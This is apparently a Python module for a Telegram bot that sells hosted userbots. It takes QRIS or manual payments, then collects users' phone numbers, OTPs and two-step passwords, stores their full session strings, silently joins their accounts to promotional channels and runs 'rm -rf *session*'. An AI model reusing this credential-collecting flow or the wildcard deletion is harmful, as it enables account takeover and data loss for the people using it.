import asyncio
import io
import httpx
import importlib
from pyrogram.errors import MessageNotModified
from datetime import datetime
from fanzy.config import *
from dateutil.relativedelta import relativedelta
from pyrogram.enums import SentCodeType
from pyrogram.errors import *
from platform import python_version
from pyrogram import __version__
from pyrogram.types import *
from pyrogram.raw import functions
from fanzy import *

active_polls = {}
otp_inputs = {}
CONFIRM_PAYMENT = []

def toRupiah(angka):
    return f"Rp {angka:,}".replace(",", ".")

# ============================================
# FUNGSI PEMBANTU
# ============================================

def fmt_user(user):
    if user.username:
        return f"@{user.username}"
    else:
        name = f"{user.first_name} {user.last_name or ''}".strip()
        if len(name) > 15:
            name = name[:12] + "..."
        return name

def fmt_id(user):
    return f"<a href=tg://user?id={user.id}>{fmt_user(user)}</a>"

# ============================================
# START
# ============================================

@PY.BOT("start")
@PY.START
@PY.PRIVATE
async def _(client, message):
    user_id = message.from_user.id
    buttons = BTN.START(message)
    msg = MSG.START(message)
    pantek = "https://files.catbox.moe/y5yesx.jpg"

    await bot.send_photo(
        user_id, 
        pantek, 
        caption=msg, 
        reply_markup=InlineKeyboardMarkup(buttons) if buttons else None
    )

# ============================================
# BUTTON BUAT USERBOT
# ============================================

@PY.CALLBACK("bahan")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id in ubot._get_my_id:
        buttons = [
            [InlineKeyboardButton("♻️ Restart", callback_data="ress_ubot")],
            [InlineKeyboardButton("🔙 Home", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            "<blockquote>✅ <b>Anda sudah membuat ubot</b>\n\nJika tidak respon, ketik /restart</blockquote>",
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    elif len(ubot._ubot) + 1 > MAX_BOT:
        buttons = [
            [InlineKeyboardButton("🔙 Home", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            f"<blockquote>❌ <b>MAX USERBOT</b>\n📚 {Fonts.smallcap(str(len(ubot._ubot)))} / {MAX_BOT}\n☎️ Hubungi <a href=tg://openmessage?user_id={OWNER_ID}>Admin</a></blockquote>",
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    
    premium_users = await get_list_from_vars(client.me.id, "PREM_USERS")
    ultra_premium_users = await get_list_from_vars(client.me.id, "ULTRA_PREM")
    
    if user_id not in premium_users and user_id not in ultra_premium_users:
        buttons = [
            [InlineKeyboardButton("💳 Beli", callback_data="bayar_dulu")],
            [InlineKeyboardButton("🔙 Home", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            "<blockquote>⚠️ ANDA BELUM PREMIUM ❗</b>\nSilakan beli userbot terlebih dahulu</blockquote>",
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    else:
        buttons = [[InlineKeyboardButton("✅ Lanjutkan", callback_data="buat_ubot")]]
        return await callback_query.edit_message_text(
            "<blockquote>✅ <b>ANDA SUDAH PREMIUM</b>\nKlik lanjutkan untuk membuat !</blockquote>",
            reply_markup=InlineKeyboardMarkup(buttons),
        )

# ============================================
# STATUS
# ============================================

@PY.CALLBACK("status")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id in ubot._get_my_id:
        buttons = [
            [InlineKeyboardButton("🔙 Home", callback_data=f"home {user_id}")],
        ]
        exp = await get_expired_date(user_id)
        prefix = await get_pref(user_id)
        waktu = exp.strftime("%d-%m-%Y") if exp else "None"
        return await callback_query.edit_message_text(
            f"<blockquote>👑 <b>STATUS USERBOT</b>\n├ Status: Premium\n├ Prefix: {prefix[0]}\n╰ Expired: {waktu}</blockquote>",
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    else:
        buttons = [
            [InlineKeyboardButton("💳 Beli", callback_data="bayar_dulu")],
            [InlineKeyboardButton("🔙 Home", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            "<blockquote>⚠️ <b>ANDA BELUM PREMIUM</b>\nSilakan beli userbot terlebih dahulu</blockquote>",
            reply_markup=InlineKeyboardMarkup(buttons),
        )

# ============================================
# BUAT UBOT (PREMIUM)
# ============================================

@PY.CALLBACK("buat_ubot")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id in ubot._get_my_id:
        buttons = [
            [InlineKeyboardButton("♻️ Restart", callback_data="ress_ubot")],
            [InlineKeyboardButton("🔙 Home", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            "<blockquote> ✅<b>Anda telah membuat ubot</b>\n\nJika tidak respon, ketik /restart</blockquote>",
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    elif len(ubot._ubot) + 1 > MAX_BOT:
        buttons = [
            [InlineKeyboardButton("🔙 Home", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            f"<blockquote>❌ <b>MAX USERBOT</b>\n📚 {Fonts.smallcap(str(len(ubot._ubot)))} / {MAX_BOT}\n☎️ Hubungi <a href=tg://openmessage?user_id={OWNER_ID}>Admin</a></blockquote>",
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    
    premium_users = await get_list_from_vars(client.me.id, "PREM_USERS")
    ultra_premium_users = await get_list_from_vars(client.me.id, "ULTRA_PREM")
    
    if user_id not in premium_users and user_id not in ultra_premium_users:
        buttons = [
            [InlineKeyboardButton("💳 Beli", callback_data="bayar_dulu")],
            [InlineKeyboardButton("🔙 Home", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            "<blockquote>⚠️ <b>ANDA BELUM PREMIUM</b>\nSilakan beli userbot terlebih dahulu</blockquote>",
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    else:
        buttons = [[InlineKeyboardButton("✅ Lanjutkan", callback_data="add_ubot")]]
        return await callback_query.edit_message_text(
            "<blockquote>📱 Siapkan nomer telegram anda\nDenga kode negara +62 yang valid\nContoh format yang valid +62xxxxx\n\nklik lanjutkan untuk mulai membuat</blockquote>",
            reply_markup=InlineKeyboardMarkup(buttons),
        )

# ============================================
# PILIH BULAN (1-12 BULAN) + METODE PEMBAYARAN
# ============================================

@PY.CALLBACK("bayar_dulu")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    buttons = [
        [InlineKeyboardButton("1 Bulan", callback_data="pilih_bulan_1"), InlineKeyboardButton("2 Bulan", callback_data="pilih_bulan_2")],
        [InlineKeyboardButton("3 Bulan", callback_data="pilih_bulan_3"), InlineKeyboardButton("4 Bulan", callback_data="pilih_bulan_4")],
        [InlineKeyboardButton("5 Bulan", callback_data="pilih_bulan_5"), InlineKeyboardButton("6 Bulan", callback_data="pilih_bulan_6")],
        [InlineKeyboardButton("7 Bulan", callback_data="pilih_bulan_7"), InlineKeyboardButton("8 Bulan", callback_data="pilih_bulan_8")],
        [InlineKeyboardButton("9 Bulan", callback_data="pilih_bulan_9"), InlineKeyboardButton("10 Bulan", callback_data="pilih_bulan_10")],
        [InlineKeyboardButton("11 Bulan", callback_data="pilih_bulan_11"), InlineKeyboardButton("12 Bulan", callback_data="pilih_bulan_12")],
        [InlineKeyboardButton("🏠 Home", callback_data=f"home {user_id}")],
    ]
    try:
       return await callback_query.edit_message_text(
        "<b>📆 Silakan pilih durasi bulan anda!</b>\n━━━━━━━━━━━━━━━━━━━━━❍</b>",
        reply_markup=InlineKeyboardMarkup(buttons),
    )
    except MessageNotModified: 
        pass

@PY.CALLBACK("pilih_bulan_1")
@PY.CALLBACK("pilih_bulan_2")
@PY.CALLBACK("pilih_bulan_3")
@PY.CALLBACK("pilih_bulan_4")
@PY.CALLBACK("pilih_bulan_5")
@PY.CALLBACK("pilih_bulan_6")
@PY.CALLBACK("pilih_bulan_7")
@PY.CALLBACK("pilih_bulan_8")
@PY.CALLBACK("pilih_bulan_9")
@PY.CALLBACK("pilih_bulan_10")
@PY.CALLBACK("pilih_bulan_11")
@PY.CALLBACK("pilih_bulan_12")
async def pilih_bulan_callback(client, callback_query):
    """Memilih bulan - lanjut ke metode pembayaran"""
    user_id = callback_query.from_user.id
    bulan = int(callback_query.data.split('_')[-1])
    jumlah = 4000 * bulan
    
    buttons = [
        [InlineKeyboardButton("📝 Manual", callback_data=f"bayar_manual_{bulan}")],
        [InlineKeyboardButton("💳 Otomatis", callback_data=f"bayar_Otomatis_{bulan}")],        
        [InlineKeyboardButton("🏠 Home", callback_data=f"home {user_id}")],
    ]
    
    await callback_query.edit_message_text(
        f"""
📆 <b>DURASI:</b> {bulan} Bulan
💰 <b>TOTAL:</b> {toRupiah(jumlah)}
━━━━━━━━━━━━━━━━━━━━━❍
<i>Silakan pilih metode pembayaran</i>
""",
        reply_markup=InlineKeyboardMarkup(buttons),
    )


@PY.CALLBACK("bayar_manual_1")
@PY.CALLBACK("bayar_manual_2")
@PY.CALLBACK("bayar_manual_3")
@PY.CALLBACK("bayar_manual_4")
@PY.CALLBACK("bayar_manual_5")
@PY.CALLBACK("bayar_manual_6")
@PY.CALLBACK("bayar_manual_7")
@PY.CALLBACK("bayar_manual_8")
@PY.CALLBACK("bayar_manual_9")
@PY.CALLBACK("bayar_manual_10")
@PY.CALLBACK("bayar_manual_11")
@PY.CALLBACK("bayar_manual_12")
async def bayar_manual_callback(client, callback_query):
    """Proses pembayaran manual - BOT.ASK bukti transfer"""
    user_id = callback_query.from_user.id
    bulan = int(callback_query.data.split('_')[-1])
    jumlah = 2000 * bulan
    full_name = f"{callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}".strip()
    get = await bot.get_users(user_id)
    
    CONFIRM_PAYMENT.append(get.id)
    
    back_buttons = [
        [InlineKeyboardButton("❌ Batal", callback_data=f"batal_confirm {user_id}")]
    ]
    
    try:
        await callback_query.message.delete()
        pesan = await bot.ask(
            user_id,
            f"""
<blockquote>
💳 <b>PEMBAYARAN MANUAL</b>


📆 <b>Bulan:</b> {bulan}
💰 <b>Total:</b> {toRupiah(jumlah)}

🏦 <b>TUJUAN TRANSFER</b>
┈➤ <b>DANA:</b> <code>628973892263</code>
┈➤ <b>A/N:</b> MxhxxmadIrfxnMxulxna

📸 Kirim FOTO bukti transfer
━━━━━━━━━━━━━━━━━━━━━❍</blockquote>
""",
            timeout=400,
            reply_markup=InlineKeyboardMarkup(back_buttons),
        )
    except asyncio.TimeoutError:
        if get.id in CONFIRM_PAYMENT:
            CONFIRM_PAYMENT.remove(get.id)
        buttons_timeout = [
            [InlineKeyboardButton("🔄 Coba Lagi", callback_data="bayar_dulu")],
            [InlineKeyboardButton("🏠 Home", callback_data=f"home {user_id}")]
        ]
        return await bot.send_message(
            get.id,
            "<blockquote>⏰ <b>WAKTU HABIS</b>\nSilakan coba lagi</blockquote>",
            reply_markup=InlineKeyboardMarkup(buttons_timeout)
        )
    
    if get.id in CONFIRM_PAYMENT:
        if not pesan.photo:
            CONFIRM_PAYMENT.remove(get.id)
            buttons = [
                [InlineKeyboardButton("✅ Coba Lagi", callback_data=f"bayar_manual_{bulan}")],
                [InlineKeyboardButton("🏠 Home", callback_data=f"home {user_id}")]
            ]
            return await bot.send_message(
                user_id,
                "<blockquote>❌ <b>BUKTI TIDAK VALID</b>\nKirim FOTO bukti transfer</blockquote>",
                reply_markup=InlineKeyboardMarkup(buttons),
            )
        else:
            buttons_admin = BTN.ADD_EXP(get.id)
            await pesan.copy(
                OWNER_ID,
                caption=f"""
💳 <b>PEMBAYARAN USER BARU</b>

👤 {full_name}
🆔 ID User <code>{user_id}</code>
💰 Harga {toRupiah(jumlah)}
📆 Durasi {bulan} Bulan
━━━━━━━━━━━━━━━━━━━━━❍

""",
                reply_markup=buttons_admin,
            )
            CONFIRM_PAYMENT.remove(get.id)
            buttons_user = [
                [InlineKeyboardButton("📞 Owner", url=f"tg://user?id={OWNER_ID}")],
                [InlineKeyboardButton("🏠 Home", callback_data=f"home {user_id}")]
            ]
            return await bot.send_message(
                user_id,
                "<blockquote>✅ <b>Bukti pembayaran telah terkirim</b>\nAdmin akan segera memverifikasi</blockquote>",
                reply_markup=InlineKeyboardMarkup(buttons_user),
            )


# ============================================
# BATAL KONFIRMASI
# ============================================

@PY.CALLBACK("^batal_confirm")
async def batal_confirm_callback(client, callback_query):
    user_id = int(callback_query.data.split()[1])
    if user_id in CONFIRM_PAYMENT:
        CONFIRM_PAYMENT.remove(user_id)
    await callback_query.message.delete()


# ============================================
# ADMIN VERIFIKASI
# ============================================

@PY.CALLBACK("^(success|failed|home)")
async def admin_verifikasi_callback(client, callback_query):
    query = callback_query.data.split()
    get_user = await bot.get_users(query[1])
    
    if query[0] == "success":
        buttons = [
            [InlineKeyboardButton("🔥 Buat Userbot", callback_data="buat_ubot")],
        ]
        await bot.send_message(
            get_user.id,
            "<blockquote>✅ <b>PEMBAYARAN DIKONFIRMASI</b>\nSilakan untuk membuat userbot</blockquote>",
            reply_markup=InlineKeyboardMarkup(buttons),
        )
        await add_to_vars(client.me.id, "PREM_USERS", get_user.id)
        now = datetime.now()
        expired = now + relativedelta(months=int(query[2]))
        await set_expired_date(get_user.id, expired)
        return await callback_query.edit_message_text(
            f"<blockquote><b>📣 NOTIFIKASI USERS BARU</b>\n\n✅ {get_user.first_name} {get_user.last_name or ''}\n📝 Ditambahkan ke Premium\n━━━━━━━━━━━━━━━━━━━━❍</blockquote>",
        )
    
    if query[0] == "failed":
        buttons = [
            [InlineKeyboardButton("💳 Beli Ulang", callback_data="bayar_dulu")],
        ]
        await bot.send_message(
            get_user.id,
            "<blockquote>❌ <b>Pembayaran Anda Ditolak ! </blockquote>",
            reply_markup=InlineKeyboardMarkup(buttons),
        )
        return await callback_query.edit_message_text(
            f"<blockquote><b>📣 NOTIFIKASI USERS BARU</b>\n\n❌ {get_user.first_name} {get_user.last_name or ''}\n📝 Tidak ditambahkan ke Premium\n━━━━━━━━━━━━━━━━━━━❍</blockquote>",
        )
    
    if query[0] == "home":
        if get_user.id in CONFIRM_PAYMENT:
            CONFIRM_PAYMENT.remove(get_user.id)
        buttons_home = BTN.START(callback_query)
        return await callback_query.edit_message_text(
            MSG.START(callback_query),
            reply_markup=InlineKeyboardMarkup(buttons_home),
        )

#================(PEMBAYARAN OTOMATIS)===============#
async def create_qris_payment(amount, ref_id):
    url = f"{PAKASIR_BASE_URL}{PAKASIR_ENDPOINTS['createQris']}"
    payload = {
        "project": PAKASIR_PROJECT_SLUG, 
        "order_id": ref_id, 
        "amount": amount, 
        "api_key": PAKASIR_API_KEY
    }
    async with httpx.AsyncClient() as client:
        try:
            response = await client.post(url, json=payload, timeout=20)
            return response.json()
        except Exception as e:
            print(f"[ERROR] Create QRIS: {e}")
            return None
            
async def check_payment_status(ref_id, amount):
    url = f"{PAKASIR_BASE_URL}{PAKASIR_ENDPOINTS['checkStatus']}"
    params = {
        "project": PAKASIR_PROJECT_SLUG,
        "amount": amount,
        "order_id": ref_id,
        "api_key": PAKASIR_API_KEY
    }
    async with httpx.AsyncClient() as client:
        try:
            response = await client.get(url, params=params, timeout=20)
            return response.json()
        except Exception as e:
            print(f"[ERROR] Check Status: {e}")
            return None

async def cancel_payment(ref_id, amount):
    url = f"{PAKASIR_BASE_URL}{PAKASIR_ENDPOINTS['cancel']}"
    payload = {
        "project": PAKASIR_PROJECT_SLUG,
        "order_id": ref_id,
        "amount": int(amount),
        "api_key": PAKASIR_API_KEY
    }
    async with httpx.AsyncClient() as client:
        try:
            response = await client.post(url, json=payload, timeout=20)
            return response.json()
        except Exception as e:
            print(f"[ERROR] Cancel Exception: {e}")
            return None
                
@PY.CALLBACK("bayar_Otomatis_1")
@PY.CALLBACK("bayar_Otomatis_2")
@PY.CALLBACK("bayar_Otomatis_3")
@PY.CALLBACK("bayar_Otomatis_4")
@PY.CALLBACK("bayar_Otomatis_5")
@PY.CALLBACK("bayar_Otomatis_6")
@PY.CALLBACK("bayar_Otomatis_7")
@PY.CALLBACK("bayar_Otomatis_8")
@PY.CALLBACK("bayar_Otomatis_9")
@PY.CALLBACK("bayar_Otomatis_10")
@PY.CALLBACK("bayar_Otomatis_11")
@PY.CALLBACK("bayar_Otomatis_12")
async def bayar_qris_callback(client, callback_query):
    user_id = callback_query.from_user.id
    bulan = int(callback_query.data.split('_')[-1])
    jumlah = 4000 * bulan
    ref_id = f"INV{int(time.time() * 1000)}"
    active_polls[ref_id] = True
    await callback_query.edit_message_text("<b>⏳ Membuat QRIS...</b>")
    res = await create_qris_payment(jumlah, ref_id)    
    if res and res.get("payment") and res["payment"].get("payment_number"):
        pay_data = res["payment"]
        qris_string = pay_data["payment_number"]
        total_bayar = pay_data.get("total_payment", jumlah)        
        qris_url = f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={qris_string}"        
        try:
            async with httpx.AsyncClient() as http_client:
                response = await http_client.get(qris_url)
                qris_file = io.BytesIO(response.content)
                qris_file.name = "qris.png"
            await callback_query.message.delete()
            qris_message = await bot.send_photo(
                user_id,
                photo=qris_file,
                caption=(
                    f"✅ <b>Transaksi telah dibuat!</b>\n\n"
                    f"💵 Total : <b>Rp {total_bayar:,}</b>\n"
                    f"🆔 ID : <code>{ref_id}</code>\n\n"
                    f"<i>Silakan scan QR diatas. Status akan diperbarui secara otomatis...............</i>"
                ),
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("❌ Batalkan", callback_data=f"cancel_qris_{ref_id}_{jumlah}")]
                ])
            )
            poll_interval = 5
            poll_timeout = 5 * 60
            start_time = time.time()
            async def poll_status():
                while True:
                    if ref_id not in active_polls:
                        print(f"[POLLING] Dihentikan karena user membatalkan: {ref_id}")
                        return
                    if (time.time() - start_time) > poll_timeout:
                        active_polls.pop(ref_id, None)
                        try:
                            await bot.delete_messages(user_id, qris_message.id)
                            await bot.send_message(
                                user_id,
                                f"⏰ Waktu cek status untuk ID <code>{ref_id}</code> habis. Silakan hubungi admin jika sudah bayar."
                            )
                        except Exception as e:
                            print(f"Error timeout cleanup: {e}")
                        return
                    try:
                        status_data = await check_payment_status(ref_id, jumlah)
                        if status_data and "transaction" in status_data:
                            trx = status_data["transaction"]
                            status_api = str(trx.get("status")).lower()
                            
                            if status_api in ['completed', 'failed', 'expired']:
                                active_polls.pop(ref_id, None) # Hapus dari poll aktif
                                
                                if status_api == 'completed':
                                    await add_to_vars(client.me.id, "PREM_USERS", user_id)
                                    now = datetime.now()
                                    expired = now + relativedelta(months=bulan)
                                    await set_expired_date(user_id, expired)                       
                                    
                                    buttons = [[InlineKeyboardButton("🔥 Buat Userbot", callback_data="add_ubot")]]
                                    await bot.send_message(
                                        user_id,
                                        "<blockquote>✅ <b>PEMBAYARAN DIKONFIRMASI</b>\nSilakan untuk membuat userbot</blockquote>",
                                        reply_markup=InlineKeyboardMarkup(buttons),
                                    )                                    
                                    try:
                                        await qris_message.delete()
                                    except: pass
                                    return                                
                                
                                else:
                                    try:
                                        await bot.delete_messages(user_id, qris_message.id)
                                        await bot.send_message(
                                            user_id,
                                            f"❌ **Transaksi {status_api.capitalize()}**\nID: <code>{ref_id}</code>\n\nSilakan coba lagi atau hubungi admin."
                                        )
                                    except: pass
                                    return 
                    except Exception as e:
                        print(f"Polling error: {e}")                   
                    await asyncio.sleep(poll_interval)
            asyncio.create_task(poll_status())        
        except Exception as e:
            await bot.send_message(user_id, f"❌ Gagal mengirim QRIS: {e}")
    else:
        await callback_query.edit_message_text("❌ Gagal membuat QRIS: Respon API tidak valid.")

@PY.CALLBACK("cancel_qris_")
async def cancel_qris_callback(client, callback_query):
    data = callback_query.data.split("_")
    ref_id = data[2]
    jumlah = data[3]
    user_id = callback_query.from_user.id        
    
    res = await cancel_payment(ref_id, jumlah)        
    if res and (res.get("success") == True or res.get("status") == True):
        # LOGIC BARU: Hapus dari active_polls untuk menghentikan loop di poll_status
        active_polls.pop(ref_id, None)
        
        await callback_query.message.delete()
        await bot.send_message(user_id, f"✅ Transaksi <code>{ref_id}</code> berhasil dibatalkan.")
    else:
        error_text = res if res else "Koneksi API Gagal"
        await callback_query.message.delete()
        await bot.send_message(user_id, f"❌ Gagal membatalkan transaksi.\n\n<code>{error_text}</code>")
                                                         
# ============================================
# PROSES BUAT UBOT
# ============================================
@PY.CALLBACK("add_ubot")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    await callback_query.message.delete()
    try:
        phone = await bot.ask(
            user_id,
            "<b>📱 Silakan masukan nomer telgram\n❌ Silakan ketik /cancel untuk batal</b>",
            timeout=300,
        )
    except asyncio.TimeoutError:
        return await bot.send_message(user_id, "<blockquote>⏰ Waktu habis! /start untuk memulai ulang</blockquote>")
    if await is_cancel(callback_query, phone.text):
        return
    phone_number = phone.text
    new_client = Ubot(
        name=str(callback_query.id),
        api_id=API_ID,
        api_hash=API_HASH,
        in_memory=False,
    )
    get_otp = await bot.send_message(user_id, "<b>🔐 Mengirim kode OTP...</b>")
    await new_client.connect()
    try:
        code = await new_client.send_code(phone_number.strip())
    except Exception as error:
        await get_otp.delete()
        return await bot.send_message(user_id, f"❌ {error}")
    
    await get_otp.delete()
    otp_inputs[user_id] = ""
    buttons = [
        [InlineKeyboardButton("1", callback_data="otp_digit_1"), InlineKeyboardButton("2", callback_data="otp_digit_2"), InlineKeyboardButton("3", callback_data="otp_digit_3")],
        [InlineKeyboardButton("4", callback_data="otp_digit_4"), InlineKeyboardButton("5", callback_data="otp_digit_5"), InlineKeyboardButton("6", callback_data="otp_digit_6")],
        [InlineKeyboardButton("7", callback_data="otp_digit_7"), InlineKeyboardButton("8", callback_data="otp_digit_8"), InlineKeyboardButton("9", callback_data="otp_digit_9")],
        [InlineKeyboardButton("⌫", callback_data="otp_delete"), InlineKeyboardButton("0", callback_data="otp_digit_0"), InlineKeyboardButton("✅", callback_data="otp_enter")],
        [InlineKeyboardButton("❌", callback_data="otp_cancel")]
    ]
    otp_msg = await bot.send_message(
        user_id,
        "<b>🔑 Masukkan kode OTP:</b>\n\nKode: <code>(kosong)</code>",
        reply_markup=InlineKeyboardMarkup(buttons)
    )
    otp_inputs[user_id] = {"code": "", "msg_id": otp_msg.id, "phone_number": phone_number, "code_obj": code, "new_client": new_client}


async def is_cancel(callback_query, text):
    if text.startswith("/cancel"):
        await bot.send_message(callback_query.from_user.id, "<blockquote>❌ Ketik /start untuk mulau ulang</blockquote>")
        return True
    return False

# ============================================
# OTP HANDLERS
# ============================================

@PY.CALLBACK("otp_digit_([0-9])")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    digit = callback_query.data.split("_")[-1]
    if user_id not in otp_inputs:
        return await callback_query.answer("Sesi OTP tidak ditemukan!", show_alert=True)
    otp_inputs[user_id]["code"] += digit
    current_code = otp_inputs[user_id]["code"]
    buttons = [
        [InlineKeyboardButton("1", callback_data="otp_digit_1"), InlineKeyboardButton("2", callback_data="otp_digit_2"), InlineKeyboardButton("3", callback_data="otp_digit_3")],
        [InlineKeyboardButton("4", callback_data="otp_digit_4"), InlineKeyboardButton("5", callback_data="otp_digit_5"), InlineKeyboardButton("6", callback_data="otp_digit_6")],
        [InlineKeyboardButton("7", callback_data="otp_digit_7"), InlineKeyboardButton("8", callback_data="otp_digit_8"), InlineKeyboardButton("9", callback_data="otp_digit_9")],
        [InlineKeyboardButton("⌫", callback_data="otp_delete"), InlineKeyboardButton("0", callback_data="otp_digit_0"), InlineKeyboardButton("✅", callback_data="otp_enter")],
        [InlineKeyboardButton("❌", callback_data="otp_cancel")]
    ]
    await callback_query.edit_message_text(
        f"<b>🔑 Masukkan kode OTP:</b>\n\nKode: <code>{current_code}</code>",
        reply_markup=InlineKeyboardMarkup(buttons)
    )

@PY.CALLBACK("otp_delete")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id not in otp_inputs:
        return await callback_query.answer("Sesi OTP tidak ditemukan!", show_alert=True)
    otp_inputs[user_id]["code"] = otp_inputs[user_id]["code"][:-1]
    current_code = otp_inputs[user_id]["code"] or "(kosong)"
    buttons = [
        [InlineKeyboardButton("1", callback_data="otp_digit_1"), InlineKeyboardButton("2", callback_data="otp_digit_2"), InlineKeyboardButton("3", callback_data="otp_digit_3")],
        [InlineKeyboardButton("4", callback_data="otp_digit_4"), InlineKeyboardButton("5", callback_data="otp_digit_5"), InlineKeyboardButton("6", callback_data="otp_digit_6")],
        [InlineKeyboardButton("7", callback_data="otp_digit_7"), InlineKeyboardButton("8", callback_data="otp_digit_8"), InlineKeyboardButton("9", callback_data="otp_digit_9")],
        [InlineKeyboardButton("⌫", callback_data="otp_delete"), InlineKeyboardButton("0", callback_data="otp_digit_0"), InlineKeyboardButton("✅", callback_data="otp_enter")],
        [InlineKeyboardButton("❌", callback_data="otp_cancel")]
    ]
    await callback_query.edit_message_text(
        f"<b>🔑 Masukkan kode OTP:</b>\n\nKode: <code>{current_code}</code>",
        reply_markup=InlineKeyboardMarkup(buttons)
    )

@PY.CALLBACK("otp_enter")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id not in otp_inputs:
        return await callback_query.answer("Sesi OTP tidak ditemukan!", show_alert=True)
    otp_code = otp_inputs[user_id]["code"]
    if not otp_code:
        return await callback_query.answer("Kode OTP kosong!", show_alert=True)
    phone_number = otp_inputs[user_id]["phone_number"]
    code = otp_inputs[user_id]["code_obj"]
    new_client = otp_inputs[user_id]["new_client"]
    del otp_inputs[user_id]
    await callback_query.message.delete()
    
    try:
        await new_client.sign_in(phone_number.strip(), code.phone_code_hash, phone_code=otp_code)
    except SessionPasswordNeeded:
        try:
            two_step_code = await bot.ask(
                user_id,
                "<b>🔐 Masukan passowrd A2f anda\n❌ gunakan /cancel untuk batall</b>",
                timeout=300,
            )
        except asyncio.TimeoutError:
            return await bot.send_message(user_id, "<blockquote>⏰ Waktu habis! /start untuk memulai ulang</blockquote>")
        if await is_cancel(callback_query, two_step_code.text):
            return
        await new_client.check_password(two_step_code.text)
    except Exception as error:
        return await bot.send_message(user_id, f"❌ {error}")
    
    session_string = await new_client.export_session_string()
    await new_client.disconnect()
    new_client.storage.session_string = session_string
    new_client.in_memory = False
    
    bot_msg = await bot.send_message(user_id, "<b>⏳ Memproses...</b>")
    await new_client.start()
    
    if user_id != new_client.me.id:
        ubot._ubot.remove(new_client)
        return await bot_msg.edit("<b>❌ Gunakan nomor Telegram Anda sendiri!</b>")
    
    await add_ubot(
        user_id=int(new_client.me.id),
        api_id=API_ID,
        api_hash=API_HASH,
        session_string=session_string,
    )
    
    for mod in loadModule():
        importlib.reload(importlib.import_module(f"fanzy.modules.{mod}"))
    
    SH = await ubot.get_prefix(new_client.me.id)
    buttons = [
        [InlineKeyboardButton("🏠 Home", callback_data=f"home {user_id}")],
    ]
    
    await bot_msg.edit(
        f"""
<blockquote>
✅ <b>USERBOT DIAKTIFKAN!</b>

👤 <b>Nama:</b> {fmt_id(new_client.me)}
🆔 <b>ID:</b> {new_client.me.id}
💢 <b>Prefix Userbot:</b> <code>[ {' '.join(SH) } ]</code>
🐍 <b>Python Version:</b> <code>{python_version()}</code>
📙 <b>Pyrogram Version:</b> <code> {__version__}</code></blockquote>
<i>Jika tidak respon, silkn ketik /restart!</i>
""",
        reply_markup=InlineKeyboardMarkup(buttons),
    )
    
    await bash("rm -rf *session*")
    await install_my_peer(new_client)
    
    try:
        await new_client.join_chat("gbpublicfanzy")
        await new_client.join_chat("fedbackfanzy")
        await new_client.join_chat("fanzyid")
        await new_client.join_chat("logsecurity")
        await new_client.join_chat("fanzysupport1")
    except:
        pass
    
    return await bot.send_message(
        LOGS_MAKER_UBOT,
        f"""
<b>⌬ USERBOT DIAKTIFKAN</b>
├ {fmt_id(new_client.me)}
╰ <code>{new_client.me.id}</code>
""",
        reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton("⏳ Cek Masa Aktif", callback_data=f"cek_masa_aktif {new_client.me.id}")]]
        ),
    )

@PY.CALLBACK("otp_cancel")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id in otp_inputs:
        del otp_inputs[user_id]
    await callback_query.message.delete()
    await bot.send_message(user_id, "<blockquote>❌ Ketik /start untuk mulau ulang</blockquote>")

# ============================================
# RESTART & CONTROL
# ============================================

@PY.BOT("control")
async def _(client, message):
    buttons = [[InlineKeyboardButton("♻️ Restart", callback_data="ress_ubot")]]
    await message.reply(
        "<blockquote>⚙️ klik restart untuk restart userbot</blockquote>",
        reply_markup=InlineKeyboardMarkup(buttons),
    )

@PY.CALLBACK("ress_ubot")
async def _(client, callback_query):
    if callback_query.from_user.id not in ubot._get_my_id:
        return await callback_query.answer("Tidak punya akses!", True)
    
    for X in ubot._ubot:
        if callback_query.from_user.id == X.me.id:
            for _ubot_ in await get_userbots():
                if X.me.id == int(_ubot_["name"]):
                    try:
                        ubot._ubot.remove(X)
                        ubot._get_my_id.remove(X.me.id)
                        UB = Ubot(**_ubot_)
                        await UB.start()
                        for mod in loadModule():
                            importlib.reload(importlib.import_module(f"fanzy.modules.{mod}"))
                        return await callback_query.edit_message_text(
                            f"<blockquote>✅ <b>RESTART BERHASIL</b>\n👤 {fmt_id(UB.me)}\n🆔 <code>{UB.me.id}</code></blockquote>"
                        )
                    except Exception as error:
                        return await callback_query.edit_message_text(f"❌ {error}")

@PY.BOT("restart")
async def _(client, message):
    msg = await message.reply("<b>⏳ Memproses...</b>")
    
    if message.from_user.id not in ubot._get_my_id:
        return await msg.edit("Tidak punya akses!")
    
    for X in ubot._ubot:
        if message.from_user.id == X.me.id:
            for _ubot_ in await get_userbots():
                if X.me.id == int(_ubot_["name"]):
                    try:
                        ubot._ubot.remove(X)
                        ubot._get_my_id.remove(X.me.id)
                        UB = Ubot(**_ubot_)
                        await UB.start()
                        for mod in loadModule():
                            importlib.reload(importlib.import_module(f"fanzy.modules.{mod}"))
                        return await msg.edit(
                            f"<blockquote>✅ <b>RESTART BERHASIL</b>\n👤 {fmt_id(UB.me)}\n🆔 <code>{UB.me.id}</code></blockquote>"
                        )
                    except Exception as error:
